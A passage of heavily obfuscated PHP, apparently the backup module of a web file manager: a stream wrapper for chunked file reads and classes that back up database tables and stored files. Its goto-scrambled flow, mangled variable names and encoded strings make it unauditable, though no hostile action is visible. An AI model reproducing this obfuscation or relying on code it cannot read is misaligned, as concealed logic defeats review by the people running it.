self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto B—­±¨·¯§; aªÓíÌæä: $this->info = $this->info($fèö‚ìØÎ†); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[œº][76]]; goto cÜåÊˆö¯ù; B—­±¨·¯§: } function stream_read($DÔ¥í¯²×‡) { $C¾„‘½Ë = $this->fileSubstr($this->pose, $DÔ¥í¯²×‡); $this->pose += strlen($C¾„‘½Ë); return $C¾„‘½Ë; } public function stream_tell() { return $this->pose; } public function stream_seek($D‹Ëé¹±óÆ, $C½½ŒÒ¬ ‘) { $d‡§Š²ˆ½• =& $_SERVER[œº]; if ($C½½ŒÒ¬ ‘ == SEEK_SET) { $this->pose = $D‹Ëé¹±óÆ; } else { if ($C½½ŒÒ¬ ‘ == SEEK_CUR) { $this->pose += $D‹Ëé¹±óÆ; } else { if ($C½½ŒÒ¬ ‘ == SEEK_END) { $this->pose = $this->info[$d‡§Š²ˆ½•[78]] + intval($D‹Ëé¹±óÆ); } } } if ($D‹Ëé¹±óÆ < 0) { $this->pose = $this->info[$d‡§Š²ˆ½•[78]] + $D‹Ëé¹±óÆ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[œº][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ešŞƒàºÈ¹, $AæîÎäë¥‚) { $dø¿ò¤Ûî =& $_SERVER[œº]; $c‚¬‹İ¢ìà = $this->info($ešŞƒàºÈ¹); return array($dø¿ò¤Ûî[1380] => 0, $dø¿ò¤Ûî[1381] => 0, $dø¿ò¤Ûî[12] => 32768 + 511, $dø¿ò¤Ûî[1382] => 0, $dø¿ò¤Ûî[1383] => 0, $dø¿ò¤Ûî[1384] => 0, $dø¿ò¤Ûî[1385] => 0, $dø¿ò¤Ûî[78] => $c‚¬‹İ¢ìà[$dø¿ò¤Ûî[78]], $dø¿ò¤Ûî[1386] => $c‚¬‹İ¢ìà[$dø¿ò¤Ûî[1255]], $dø¿ò¤Ûî[1342] => $c‚¬‹İ¢ìà[$dø¿ò¤Ûî[84]], $dø¿ò¤Ûî[1341] => $c‚¬‹İ¢ìà[$dø¿ò¤Ûî[194]], $dø¿ò¤Ûî[1387] => 0, $dø¿ò¤Ûî[1388] => 0); } static $fileInfo = array(); public function info($aòÀŠè) { $dÏÜá×á„ = $_SERVER[œº][1389]; if (isset(self::$fileInfo[$aòÀŠè])) { return self::$fileInfo[$aòÀŠè]; } if (substr($aòÀŠè, 0, strlen($dÏÜá×á„)) != $dÏÜá×á„) { return !1; } self::$fileInfo[$aòÀŠè] = IO::info(substr($aòÀŠè, strlen($dÏÜá×á„))); return self::$fileInfo[$aòÀŠè]; } public static function read($aËÅ„¸÷, $a³¯©ÕÃº, $fµùí¤æ·ì) { if (!isset(self::$_fopenCache[$aËÅ„¸÷])) { $fœƒ¥Ëªä = new StreamWrapperIO(); $fœƒ¥Ëªä->stream_open($aËÅ„¸÷); self::$_fopenCache[$aËÅ„¸÷] = $fœƒ¥Ëªä; } $fœƒ¥Ëªä = self::$_fopenCache[$aËÅ„¸÷]; return $fœƒ¥Ëªä->fileSubstr($a³¯©ÕÃº, $fµùí¤æ·ì); } public static function _read($AÅ¼Ë÷Ö³â, $fÌÍé…ŸĞ–, $e¢É“êŒŸ²) { goto bÓ¼öîÈ¢; bÓ¼öîÈ¢: $fîŠƒÜ†¯ =& $_SERVER[œº]; $dÚÌÂ‹…ßÆ = fopen($AÅ¼Ë÷Ö³â, $fîŠƒÜ†¯[1259]); if (!$dÚÌÂ‹…ßÆ) { return $fîŠƒÜ†¯[33]; } goto AğêøÌÎ÷; AğêøÌÎ÷: $BŒİ”©Œ³ô = 8192; fseek($dÚÌÂ‹…ßÆ, $fÌÍé…ŸĞ–, SEEK_SET); $b“ˆãÇÄÅ‰ = $fîŠƒÜ†¯[33]; goto cñŞìÆóÀ÷; cñŞìÆóÀ÷: $DùÑ¦‘ä = 0; while ($DùÑ¦‘ä < $e¢É“êŒŸ²) { $båŠîˆéš = min($BŒİ”©Œ³ô, $e¢É“êŒŸ² - $DùÑ¦‘ä); $b“ˆãÇÄÅ‰ .= fread($dÚÌÂ‹…ßÆ, $båŠîˆéš); $DùÑ¦‘ä += $båŠîˆéš; } fclose($dÚÌÂ‹…ßÆ); goto f„´ã¿Î…²; f„´ã¿Î…²: return $b“ˆãÇÄÅ‰; goto E“Â¢›ÜÆĞ; E“Â¢›ÜÆĞ: } public function fileSubstr($EíÌ‹œª±à, $c•ùå‹‰ó) { goto BÁòÕ‰’¹Ş; FâšŞàí¼É: if ($EíÌ‹œª±à + $c•ùå‹‰ó > $FÌÍ†ìŸ×¢) { $c•ùå‹‰ó = $FÌÍ†ìŸ×¢ - $EíÌ‹œª±à; } if ($c•ùå‹‰ó <= 0) { return $A•àõà§[33]; } if ($EíÌ‹œª±à < 0 || $EíÌ‹œª±à >= $FÌÍ†ìŸ×¢ || $c•ùå‹‰ó <= 0 || $c•ùå‹‰ó > 1024 * 1024 * 5) { throw new Exception("\151\x6f\106\x69\154\145\x52\145\x61\x64\x20\145\x72\162\x6f\162\x21\40\x73\x74\141\x72\164\75{$EíÌ‹œª±à}\73\154\145\x6e\x67\x74\x68\x3d{$c•ùå‹‰ó}\x3b\40\163\151\x7a\145\x3d{$FÌÍ†ìŸ×¢}\x3b"); } goto CêÜ¹ã¨•¥; Fî„ó„ß¤÷: $A±ÑÂøâÓ = ceil(($EíÌ‹œª±à + $c•ùå‹‰ó) / $c„¾ªÜÕÛ·) * $c„¾ªÜÕÛ· - $A Ñ¦Ü¡¨»; $C´Ğƒ¬á¤Œ = IO::fileSubstr($this->path, $A Ñ¦Ü¡¨», $A±ÑÂøâÓ); $d¬Èä¾àù¼[$A Ñ¦Ü¡¨» . $A•àõà§[33]] = $C´Ğƒ¬á¤Œ; goto B Âí¶¾³’; CêÜ¹ã¨•¥: $c„¾ªÜÕÛ· = 64 * 1024; $d¬Èä¾àù¼ =& self::$_chunkBuffer[$this->path]; if (!$d¬Èä¾àù¼) { $d¬Èä¾àù¼ = array(); } goto F—¤ºÂ¥ÅĞ; e™Ï¶ˆÙÑ: $c“ä†Ğ¶ªñ = $c•ùå‹‰ó; if ($EíÌ‹œª±à < 0) { $EíÌ‹œª±à = $FÌÍ†ìŸ×¢ + $EíÌ‹œª±à; } if ($c•ùå‹‰ó === !1) { $c•ùå‹‰ó = $FÌÍ†ìŸ×¢ - $EíÌ‹œª±à; } goto FâšŞàí¼É; B Âí¶¾³’: ksort($d¬Èä¾àù¼); $CŒïåŒ“ƒ³ = substr($C´Ğƒ¬á¤Œ, $EíÌ‹œª±à - $A Ñ¦Ü¡¨», $c•ùå‹‰ó); return $CŒïåŒ“ƒ³; goto dËŠë•Àª; F—¤ºÂ¥ÅĞ: $dÕ†§ñ‹ÚÀ = 0; $cãåöòÆ’İ = 0; $f± ’á»¤ = $A•àõà§[33]; goto aÉè¬İÈåÉ; BÁòÕ‰’¹Ş: $A•àõà§ =& $_SERVER[œº]; $FÌÍ†ìŸ×¢ = $this->info[$A•àõà§[78]]; $BÔŠŞåö = $EíÌ‹œª±à; goto e™Ï¶ˆÙÑ; aÉè¬İÈåÉ: foreach ($d¬Èä¾àù¼ as $dÕ†§ñ‹ÚÀ => $f± ’á»¤) { $dÕ†§ñ‹ÚÀ = intval($dÕ†§ñ‹ÚÀ); $cãåöòÆ’İ = $dÕ†§ñ‹ÚÀ + strlen($f± ’á»¤); if ($EíÌ‹œª±à >= $cãåöòÆ’İ) { continue; } if ($EíÌ‹œª±à >= $dÕ†§ñ‹ÚÀ && $EíÌ‹œª±à + $c•ùå‹‰ó <= $cãåöòÆ’İ) { return substr($f± ’á»¤, $EíÌ‹œª±à - $dÕ†§ñ‹ÚÀ, $c•ùå‹‰ó); } break; } if (count($d¬Èä¾àù¼) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($A•àõà§[1390], $A•àõà§[1391] . count($d¬Èä¾àù¼) . "\x3b\163\x74\x61\x72\x74\75{$EíÌ‹œª±à}\54\154\x65\156\147\x74\x68\75{$c•ùå‹‰ó}\x3b\160\157\x73\145\x3a{$dÕ†§ñ‹ÚÀ}\176{$cãåöòÆ’İ}"); throw new Exception($A•àõà§[1392]); } $A Ñ¦Ü¡¨» = intval($EíÌ‹œª±à / $c„¾ªÜÕÛ·) * $c„¾ªÜÕÛ·; goto Fî„ó„ß¤÷; dËŠë•Àª: } private function log($B–ÆÅ‡ùó·, $E¹”Æ–ŸŠ®) { $dö›…›‘« =& $_SERVER[œº]; $C‡„¼Ü­¤¥ = timeFloat() - $this->timeStart; write_log(sprintf($dö›…›‘«[1393], $B–ÆÅ‡ùó·, $this->info[$dö›…›‘«[28]], $C‡„¼Ü­¤¥, $E¹”Æ–ŸŠ®), $dö›…›‘«[1078]); } } goto D–îĞÅ°”; bÊ™¥÷ò¦à: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto aÆÀ¸ùá°®; CÈ‚æ©¢È: foreach ($dÑ¿Í×‚ë as $c‰ÖÊÑÛÁ£) { $B•Ó²…¯å += $f ¹Ô·‹¤‘->model($c‰ÖÊÑÛÁ£)->count(); } $b²´¿ÎÆ¯° = new Task($DÅÑÊ­³¯ƒ[741], $DÅÑÊ­³¯ƒ[742], $B•Ó²…¯å, LNG($DÅÑÊ­³¯ƒ[743]) . $DÅÑÊ­³¯ƒ[744] . LNG($DÅÑÊ­³¯ƒ[745])); foreach ($dÑ¿Í×‚ë as $c‰ÖÊÑÛÁ£) { $Aê¬ëì×ƒ = $CŠµºÙì¢í . $c‰ÖÊÑÛÁ£ . $DÅÑÊ­³¯ƒ[746]; $d³¯„×§ = null; if ($c‰ÖÊÑÛÁ£ == $DÅÑÊ­³¯ƒ[747] && (!isset($dÜõ’Ëçôë[$DÅÑÊ­³¯ƒ[715]]) || $dÜõ’Ëçôë[$DÅÑÊ­³¯ƒ[715]] == $DÅÑÊ­³¯ƒ[191])) { $d³¯„×§ = self::$io; } $FùÔ¦²á±¶ += $f ¹Ô·‹¤‘->sqlFromDb($c‰ÖÊÑÛÁ£, $Aê¬ëì×ƒ, $b²´¿ÎÆ¯°, $d³¯„×§); } goto e´´¸‰åòÒ; BÃ‘ä›¸÷: $B•Ó²…¯å = $FùÔ¦²á±¶ = 0; try { $dÑ¿Í×‚ë = $f ¹Ô·‹¤‘->db()->getTables(); } catch (Exception $e‹¥ùÄ³‡) { return !1; } $dÑ¿Í×‚ë = array_diff($dÑ¿Í×‚ë, array($DÅÑÊ­³¯ƒ[739], $DÅÑÊ­³¯ƒ[740])); goto CÈ‚æ©¢È; CÏ¨Ë‘¬¤Ì: Backup::set($aùÌÜ¢õæ©); if ($B•Ó²…¯å > $FùÔ¦²á±¶) { write_log(array($DÅÑÊ­³¯ƒ[753], $aùÌÜ¢õæ©), $DÅÑÊ­³¯ƒ[742]); return !1; } return !0; goto E’ å…ÛÃî; aàà™¶âîŒ: $f ¹Ô·‹¤‘ = new DbManage($BõÂŠòÎ, $d¸‡Î¥±‰‚); $aùÌÜ¢õæ© = array($DÅÑÊ­³¯ƒ[736] => $d¸‡Î¥±‰‚, $DÅÑÊ­³¯ƒ[737] => time()); Backup::set($aùÌÜ¢õæ©); goto a›Ä¦¼¿Ø; aÆÀ¸ùá°®: $DÅÑÊ­³¯ƒ =& $_SERVER[œº]; $dÜõ’Ëçôë = Backup::get(); self::$io = $dÜõ’Ëçôë[$DÅÑÊ­³¯ƒ[712]]; goto a¶î·—»ÌÑ; e´´¸‰åòÒ: if (isset($b²´¿ÎÆ¯°->task[$DÅÑÊ­³¯ƒ[748]])) { $D¾«˜¿Â = $b²´¿ÎÆ¯°->task[$DÅÑÊ­³¯ƒ[748]] ? $b²´¿ÎÆ¯°->task[$DÅÑÊ­³¯ƒ[748]] : timeFloat(); $F‚êíÀŠâŸ = $D¾«˜¿Â - $b²´¿ÎÆ¯°->task[$DÅÑÊ­³¯ƒ[749]]; if ($F‚êíÀŠâŸ >= 0.2) { $B•Ó²…¯å += 1; } } $b²´¿ÎÆ¯°->end(); $aùÌÜ¢õæ© = array($DÅÑÊ­³¯ƒ[736] => $d¸‡Î¥±‰‚, $DÅÑÊ­³¯ƒ[733] => 1, $DÅÑÊ­³¯ƒ[750] => $B•Ó²…¯å, $DÅÑÊ­³¯ƒ[751] => $FùÔ¦²á±¶, $DÅÑÊ­³¯ƒ[752] => time()); goto CÏ¨Ë‘¬¤Ì; a›Ä¦¼¿Ø: $CŠµºÙì¢í = $this->tmpFilesPath() . $DÅÑÊ­³¯ƒ[738] . self::$name . $DÅÑÊ­³¯ƒ[8]; del_dir($CŠµºÙì¢í); mk_dir($CŠµºÙì¢í); goto BÃ‘ä›¸÷; a¶î·—»ÌÑ: self::$name = $dÜõ’Ëçôë[$DÅÑÊ­³¯ƒ[28]]; $BõÂŠòÎ = $GLOBALS[$DÅÑÊ­³¯ƒ[6]][$DÅÑÊ­³¯ƒ[17]]; $d¸‡Î¥±‰‚ = $this->_dbType($BõÂŠòÎ); goto aàà™¶âîŒ; E’ å…ÛÃî: } private function _dbType($dÉŞ½ˆ„÷ö) { goto EÑ½Á¶©Ö; c×ƒˆÎ«ã‹: return $aˆ‚ÉÕà‚ô; goto B»ë‡’™ˆ¿; EÑ½Á¶©Ö: $e×¨öËÄÖ® =& $_SERVER[œº]; $dÉŞ½ˆ„÷ö = array_change_key_case($dÉŞ½ˆ„÷ö); $aˆ‚ÉÕà‚ô = $dÉŞ½ˆ„÷ö[$e×¨öËÄÖ®[754]]; goto AËèŠâœä; AËèŠâœä: if ($aˆ‚ÉÕà‚ô == $e×¨öËÄÖ®[755]) { $e„™‰âßë® = explode($e×¨öËÄÖ®[4], $dÉŞ½ˆ„÷ö[$e×¨öËÄÖ®[756]]); $aˆ‚ÉÕà‚ô = $e„™‰âßë®[0]; } $cŸÏ©‚¿” = array($e×¨öËÄÖ®[757] => $e×¨öËÄÖ®[9], $e×¨öËÄÖ®[758] => $e×¨öËÄÖ®[759]); if (isset($cŸÏ©‚¿”[$aˆ‚ÉÕà‚ô])) { $aˆ‚ÉÕà‚ô = $cŸÏ©‚¿”[$aˆ‚ÉÕà‚ô]; } goto c×ƒˆÎ«ã‹; B»ë‡’™ˆ¿: } private function tmpFilesPath() { $bœÀÍ”ÓÃç =& $_SERVER[œº]; $dè‚¾‰ÆÑ = TEMP_FILES; if ($GLOBALS[$bœÀÍ”ÓÃç[6]][$bœÀÍ”ÓÃç[88]][$bœÀÍ”ÓÃç[760]]) { $dè‚¾‰ÆÑ = $GLOBALS[$bœÀÍ”ÓÃç[6]][$bœÀÍ”ÓÃç[88]][$bœÀÍ”ÓÃç[760]]; if (!mk_dir($dè‚¾‰ÆÑ) || !is_writable($dè‚¾‰ÆÑ) || !IO::mkfile($dè‚¾‰ÆÑ . $bœÀÍ”ÓÃç[761])) { $dè‚¾‰ÆÑ = TEMP_FILES; } } return $dè‚¾‰ÆÑ; } } class BackupDbFile { public function __construct() { } public function index() { goto aƒéŒ «á”; C“ÂøŠˆ…: $Eî…åµÉç« = new TaskFileTransfer($EÍ”Äâ¯Ì…[764], $EÍ”Äâ¯Ì…[742], count($fØÍ”Ê­ÕŞ), LNG($EÍ”Äâ¯Ì…[743]) . $EÍ”Äâ¯Ì…[440] . LNG($EÍ”Äâ¯Ì…[745]) . $EÍ”Äâ¯Ì…[765]); $Eî…åµÉç«->task[$EÍ”Äâ¯Ì…[723]] = $CõÜõÈÊò; foreach ($f×—¬åÃ˜Ë[$EÍ”Äâ¯Ì…[74]] as $Eê«“í­§ˆ) { $AïÓ“©‘ì = IO::move($Eê«“í­§ˆ[$EÍ”Äâ¯Ì…[76]], $eÇß†•­¡£); if (!$AïÓ“©‘ì) { $Eî…åµÉç«->end(); $b¾˜‘›ŠŒ² = IO::getLastError($EÍ”Äâ¯Ì…[766] . $Eê«“í­§ˆ[$EÍ”Äâ¯Ì…[76]] . $EÍ”Äâ¯Ì…[767] . $eÇß†•­¡£ . $EÍ”Äâ¯Ì…[504]); write_log($b¾˜‘›ŠŒ², $EÍ”Äâ¯Ì…[742]); return !1; } } goto fùšÀ§£“; d—‹Æ ˜é: if (!$CõÜõÈÊò) { return !1; } $cèõ—Æ‰ĞÕ = array($EÍ”Äâ¯Ì…[762] => $CõÜõÈÊò, $EÍ”Äâ¯Ì…[763] => time()); Backup::set($cèõ—Æ‰ĞÕ); goto C“ÂøŠˆ…; Bó™•„Šİˆ: $f×—¬åÃ˜Ë = IO::listPath($AĞ»‹»»¹); $fØÍ”Ê­ÕŞ = isset($f×—¬åÃ˜Ë[$EÍ”Äâ¯Ì…[74]]) ? $f×—¬åÃ˜Ë[$EÍ”Äâ¯Ì…[74]] : array(); $CõÜõÈÊò = array_sum(array_column($fØÍ”Ê­ÕŞ, $EÍ”Äâ¯Ì…[78])); goto d—‹Æ ˜é; fùšÀ§£“: $D£š÷ÂÓÙ‹ = CONTROLLER_DIR . $EÍ”Äâ¯Ì…[768]; $A–¶‰ìæèŒ = CONTROLLER_DIR . $EÍ”Äâ¯Ì…[769]; IO::copy($D£š÷ÂÓÙ‹, $eÇß†•­¡£); goto cßƒ£éª»Ê; dğÆãÅºÈù: $AĞ»‹»»¹ = $this->tmpFilesPath() . "\142\x61\x63\153\165\160\137{$A™¦£¨…Ğá}\57"; $eÇß†•­¡£ = $this->backupPath($a“¢Ğ„¤ñ¿); if (!($eÇß†•­¡£ = IO::mkdir($eÇß†•­¡£))) { return !1; } goto Bó™•„Šİˆ; aƒéŒ «á”: $EÍ”Äâ¯Ì… =& $_SERVER[œº]; $a“¢Ğ„¤ñ¿ = Backup::get(); $A™¦£¨…Ğá = $a“¢Ğ„¤ñ¿[$EÍ”Äâ¯Ì…[28]]; goto dğÆãÅºÈù; Eíß¥¨Ğ¹: Backup::set($cèõ—Æ‰ĞÕ); return !0; goto CŸ‹Œ ß„Ó; cßƒ£éª»Ê: IO::copy($A–¶‰ìæèŒ, $eÇß†•­¡£); $Eî…åµÉç«->end(); $cèõ—Æ‰ĞÕ = array($EÍ”Äâ¯Ì…[770] => $CõÜõÈÊò, $EÍ”Äâ¯Ì…[771] => time()); goto Eíß¥¨Ğ¹; CŸ‹Œ ß„Ó: } private function backupPath($CÊÛë¯òç¢) { $DÚÖøÉÃ‰Õ =& $_SERVER[œº]; $CÏ¤†©‡Ü² = $CÊÛë¯òç¢[$DÚÖøÉÃ‰Õ[28]]; $CÓå¯¹õ = Model($DÚÖøÉÃ‰Õ[730])->get($DÚÖøÉÃ‰Õ[731]); $bÌÂùƒ²Şá = substr(md5($DÚÖøÉÃ‰Õ[732] . $CÓå¯¹õ . $CÏ¤†©‡Ü²), 0, 8); return "\x7b\x69\x6f\72{$CÊÛë¯òç¢[$DÚÖøÉÃ‰Õ[712]]}\x7d\x2f\x64\x61\164\x61\142\x61\x73\145\x2f\142\x61\143\x6b\x75\160\57" . $CÏ¤†©‡Ü² . $DÚÖøÉÃ‰Õ[71] . $bÌÂùƒ²Şá; } private function tmpFilesPath() { $bÚ™çö–¹º =& $_SERVER[œº]; $b­¯“­‡¦Š = TEMP_FILES; if ($GLOBALS[$bÚ™çö–¹º[6]][$bÚ™çö–¹º[88]][$bÚ™çö–¹º[760]]) { $b­¯“­‡¦Š = $GLOBALS[$bÚ™çö–¹º[6]][$bÚ™çö–¹º[88]][$bÚ™çö–¹º[760]]; if (!mk_dir($b­¯“­‡¦Š) || !is_writable($b­¯“­‡¦Š) || !IO::mkfile($b­¯“­‡¦Š . $bÚ™çö–¹º[761])) { $b­¯“­‡¦Š = TEMP_FILES; } } return $b­¯“­‡¦Š; } } class BackupFile { public function __construct() { } public function index() { goto bñ½•¥é¶ô; B¢ê¼ƒÚö¾: $aŠ˜Š¸Ì = $E«‰Š¸éÅ = 0; do { $eÅŒ‚©ÍÌ = $_SERVER[œº][779]; $dÚœ ²á„– = Model($_SERVER[œº][747])->where($EÙîŠ›ë½‘)->field($eÅŒ‚©ÍÌ)->order($_SERVER[œº][780])->selectPage($B§Ø±Éì¼, $eò¡Ìê†ã); $D‘õ½ˆñƒÛ = !empty($dÚœ ²á„–[$_SERVER[œº][367]]) ? $dÚœ ²á„–[$_SERVER[œº][367]] : array(); foreach ($D‘õ½ˆñƒÛ as $DŞÖí²±öß) { goto FŞ«ÌŞõƒ; FŞ«ÌŞõƒ: if (!$this->_fileExist($DŞÖí²±öß, $aê¸ßÕØ¡¶, $AõÜ«ì„«Ã)) { $eŠ†æ­àå¥ -= 1; $ağù«•ÚÒ -= (int) $DŞÖí²±öß[$_SERVER[œº][78]]; write_log("\x66\x69\154\x65\40\x6e\x6f\x74\x20\x65\x78\151\x73\164\x2e\146\151\154\145\x49\104\72{$DŞÖí²±öß[$_SERVER[œº][447]]}\54\x20\160\x61\x74\x68\72{$DŞÖí²±öß[$_SERVER[œº][76]]}", $_SERVER[œº][781]); continue; } $E³ÆÂÇ¯®å = $DŞÖí²±öß[$_SERVER[œº][76]]; $f¿¨ö¹Ò³Œ = "\173\x69\x6f\x3a{$dĞÈÀáç¶Ç[$_SERVER[œº][712]]}\175" . substr($E³ÆÂÇ¯®å, strlen("\173\151\157\72{$DŞÖí²±öß[$_SERVER[œº][782]]}\175")); goto dáŸ¼å¾¥; A‘‡š¥Û§: $Cê›©âËƒ¢ += $DŞÖí²±öß[$_SERVER[œº][78]]; $E«‰Š¸éÅ += 1; $aŠ˜Š¸Ì += $DŞÖí²±öß[$_SERVER[œº][78]]; goto BÆ¤»º¶ê; BÆ¤»º¶ê: if ($Cê›©âËƒ¢ >= 1024 * 1024 * 100) { $C«å†‘Ü©â = array($_SERVER[œº][785] => $dêÛ–£Ìœ, $_SERVER[œº][786] => $E«‰Š¸éÅ, $_SERVER[œº][787] => $aŠ˜Š¸Ì); Backup::set($C«å†‘Ü©â); $Cê›©âËƒ¢ = $fÆôÏñŸ·¬ = 0; } goto càÀ°”¥Çã; dáŸ¼å¾¥: if (IO::exist($f¿¨ö¹Ò³Œ)) { $e‰²âÇƒ©->updateFileEnd($DŞÖí²±öß[$_SERVER[œº][28]], $DŞÖí²±öß[$_SERVER[œº][78]]); } else { $f¿¨ö¹Ò³Œ = get_path_father($f¿¨ö¹Ò³Œ); IO::mkdir($f¿¨ö¹Ò³Œ); if (!IO::copy($E³ÆÂÇ¯®å, $f¿¨ö¹Ò³Œ, $_SERVER[œº][783])) { write_log($_SERVER[œº][784] . $E³ÆÂÇ¯®å . $_SERVER[œº][767] . $f¿¨ö¹Ò³Œ . $_SERVER[œº][504], $_SERVER[œº][742]); $Dí˜¨˜‡¾­ = !1; break; } } $dêÛ–£Ìœ = $DŞÖí²±öß[$_SERVER[œº][447]]; $fÆôÏñŸ·¬ += 1; goto A‘‡š¥Û§; càÀ°”¥Çã: } $CÈƒ¬ŞÃ®® = count($D‘õ½ˆñƒÛ); $eò¡Ìê†ã++; } while ($CÈƒ¬ŞÃ®® == $B§Ø±Éì¼); $e‰²âÇƒ©->end(); goto eÇŒôÒ»ô©; eÆ©ùŠŠ¸Ó: $e‰²âÇƒ©->task[$_SERVER[œº][723]] = $ağù«•ÚÒ; $C«å†‘Ü©â = array($_SERVER[œº][776] => $eŠ†æ­àå¥, $_SERVER[œº][777] => $ağù«•ÚÒ, $_SERVER[œº][778] => time()); Backup::set($C«å†‘Ü©â); goto aĞÀ«°Ó½É; Cä¤º„¼ŠŒ: $eŠ†æ­àå¥ = (int) Model($_SERVER[œº][747])->where($EÙîŠ›ë½‘)->count($_SERVER[œº][447]); $ağù«•ÚÒ = (int) Model($_SERVER[œº][747])->where($EÙîŠ›ë½‘)->sum($_SERVER[œº][78]); $e‰²âÇƒ© = new TaskFileTransfer($_SERVER[œº][774], $_SERVER[œº][742], $eŠ†æ­àå¥, LNG($_SERVER[œº][743]) . $_SERVER[œº][744] . LNG($_SERVER[œº][775])); goto eÆ©ùŠŠ¸Ó; fÖ•ãÉ†: $B§Ø±Éì¼ = 1000; $Cê›©âËƒ¢ = $fÆôÏñŸ·¬ = 0; $aê¸ßÕØ¡¶ = array(); goto B¢ê¼ƒÚö¾; bñ½•¥é¶ô: $dĞÈÀáç¶Ç = Backup::get(); $dêÛ–£Ìœ = $dĞÈÀáç¶Ç[$_SERVER[œº][291]][$_SERVER[œº][193]][$_SERVER[œº][447]]; $EÙîŠ›ë½‘ = array($_SERVER[œº][448] => array($_SERVER[œº][772], $dêÛ–£Ìœ), $_SERVER[œº][773] => array($_SERVER[œº][329], $dĞÈÀáç¶Ç[$_SERVER[œº][712]])); goto Cä¤º„¼ŠŒ; eÇŒôÒ»ô©: $C«å†‘Ü©â = array($_SERVER[œº][788] => 1, $_SERVER[œº][476] => time(), $_SERVER[œº][735] => 1, $_SERVER[œº][785] => $dêÛ–£Ìœ, $_SERVER[œº][777] => $ağù«•ÚÒ, $_SERVER[œº][776] => $eŠ†æ­àå¥, $_SERVER[œº][789] => time()); if ($fÆôÏñŸ·¬) { $C«å†‘Ü©â[$_SERVER[œº][786]] = $E«‰Š¸éÅ; $C«å†‘Ü©â[$_SERVER[œº][787]] = $aŠ˜Š¸Ì; } Backup::set($C«å†‘Ü©â); goto c¤‰ƒèªù; c¤‰ƒèªù: $this->_fileFilter($aê¸ßÕØ¡¶); return !0; goto A…îãêì; aĞÀ«°Ó½É: $Dí˜¨˜‡¾­ = !0; $AõÜ«ì„«Ã = $this->storeIds(); $eò¡Ìê†ã = 1; goto fÖ•ãÉ†; A…îãêì: } private function _fileExist($Eõ¾µ†¿½, &$eä¹ÈÆ˜á, $C–ëÃ¤³‘—) { goto DÒ¹¥‰ªß; c‹‡ÈêÉ: $eä¹ÈÆ˜á = array_merge($eä¹ÈÆ˜á, array_to_keyvalue($cÍ¯†¢×¤›, $b´Ï…ö‘ÚÊ[33], $b´Ï…ö‘ÚÊ[447])); return !1; goto cì§ŠØ†ÜØ; FÈ‚Õ¿œ§­: if (!in_array($Eõ¾µ†¿½[$b´Ï…ö‘ÚÊ[782]], $C–ëÃ¤³‘—)) { return !1; } if (IO::exist($B¶¾ÚÑ‘Ã³)) { return !0; } $fª¡çƒÀ¤ = get_path_father($B¶¾ÚÑ‘Ã³); goto aŸ¤¢ğóÉÉ; aŸ¤¢ğóÉÉ: if (IO::exist($fª¡çƒÀ¤)) { $eä¹ÈÆ˜á[] = $Eõ¾µ†¿½[$b´Ï…ö‘ÚÊ[447]]; return !1; } $b»¤¢Èå = array($b´Ï…ö‘ÚÊ[782] => $Eõ¾µ†¿½[$b´Ï…ö‘ÚÊ[782]], $b´Ï…ö‘ÚÊ[76] => array($b´Ï…ö‘ÚÊ[380], "{$fª¡çƒÀ¤}\45")); $cÍ¯†¢×¤› = Model($b´Ï…ö‘ÚÊ[747])->where($b»¤¢Èå)->field($b´Ï…ö‘ÚÊ[448])->select(); goto c‹‡ÈêÉ; DÒ¹¥‰ªß: $b´Ï…ö‘ÚÊ =& $_SERVER[œº]; $B¶¾ÚÑ‘Ã³ = $Eõ¾µ†¿½[$b´Ï…ö‘ÚÊ[76]]; if (in_array($Eõ¾µ†¿½[$b´Ï…ö‘ÚÊ[447]], $eä¹ÈÆ˜á)) { return !1; } goto FÈ‚Õ¿œ§­; cì§ŠØ†ÜØ: } private function _fileFilter($BŒ áë­´) { $CóŒâ‘Î§Ù =& $_SERVER[œº]; if (empty($BŒ áë­´)) { return; } $f¤Ù™‘‘Î = array($CóŒâ‘Î§Ù[447] => array($CóŒâ‘Î§Ù[7], array_unique($BŒ áë­´))); $b©¹„¸öçì = Model($CóŒâ‘Î§Ù[790])->where($f¤Ù™‘‘Î)->field($CóŒâ‘Î§Ù[395])->select(); foreach ($b©¹„¸öçì as $e²¼¬Æ¡Ô½) { Model($CóŒâ‘Î§Ù[790])->remove($e²¼¬Æ¡Ô½[$CóŒâ‘Î§Ù[395]], !1); } } private function storeIds() { $e¶´¿ÉÚ§ª =& $_SERVER[œº]; $Fºè„ïÈĞ = Model($e¶´¿ÉÚ§ª[727])->listData(); $dÃ™Ì±ë§ö = array(); $d¾Œ´Ø¢Õî = $GLOBALS[$e¶´¿ÉÚ§ª[6]][$e¶´¿ÉÚ§ª[88]][$e¶´¿ÉÚ§ª[791]]; foreach ($Fºè„ïÈĞ as $A‹‘²–ÒêÕ) { $eíÏŒÏ®±¸ = strtolower($A‹‘²–ÒêÕ[$e¶´¿ÉÚ§ª[94]]); if (!isset($d¾Œ´Ø¢Õî[$eíÏŒÏ®±¸])) { continue; } $e‰×¿ˆˆî‘ = $e¶´¿ÉÚ§ª[72] . (isset($d¾Œ´Ø¢Õî[$eíÏŒÏ®±¸]) ? $d¾Œ´Ø¢Õî[$eíÏŒÏ®±¸] : ucfirst($eíÏŒÏ®±¸)); if (!class_exists($e‰×¿ˆˆî‘)) { continue; } $dÃ™Ì±ë§ö[] = $A‹‘²–ÒêÕ[$e¶´¿ÉÚ§ª[393]]; } return $dÃ™Ì±ë§ö; } } goto B¡¢à´Ç¸¯; Cù’›ÎåÁß: class DbManage { function __construct($b‘ÌßÆß, $B¾ŠÃìÍù¦ = '') { $this->database = $b‘ÌßÆß; $this->type = $B¾ŠÃìÍù¦; } public function model($f†ØÂ„ÑïÃ = '') { return new ModelBase($f†ØÂ„ÑïÃ, $_SERVER[œº][33], $this->database); } public function db($EÚùõ‹Õ¸å = false) { goto c·µÒÚø£Ã; aÆ ×ö¤‰: if (!$c‘Í•®ò”–) { $bé¥ø‰ŠéÚ->execute("\143\x72\145\141\164\x65\40\144\x61\x74\141\x62\x61\163\145\40\x60{$BÒ‰›Åœô™}\x60"); } $BƒÊòÇÔ™[$DöÑªÖ¯©[929]] = $BÒ‰›Åœô™; if 